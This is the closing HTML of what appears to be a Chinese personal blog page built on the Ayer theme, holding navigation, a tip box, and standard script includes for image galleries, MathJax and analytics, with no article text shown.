        <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>
      </div>
    </main>
      <aside class="sidebar">
        <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/images/1.jpg" alt="0Rld"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/2020/about">About</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="Search">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
      </aside>
      <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>Buy me a cup of coffee~</p>
  <div class="reward-box">
    
    <div class="reward-item">
      <img class="reward-img" src="/images/alipay.jpg">
      <span class="reward-type">支付宝</span>
    </div>
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
      
<script src="/js/jquery-2.0.3.min.js"></script>


<script src="/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/lazyload.min.js"></script>


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<script src="/js/share.js"></script>



<script src="/fancybox/jquery.fancybox.min.js"></script>




<script>
  try {
    var typed = new Typed("#subtitle", {
    strings: ['四季更替，梦境更迭','生活,旅行,思考,代码,博客','努力一定会有所获！'],
    startDelay: 0,
    typeSpeed: 200,
    loop: true,
    backSpeed: 100,
    showCursor: true
    });
  } catch (err) {
  }
  
</script>




<script>
  var ayerConfig = {
    mathjax: true
  }
</script>


<script src="/js/ayer.js"></script>


<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script>



<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>


<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
  </div>
</body>

</html>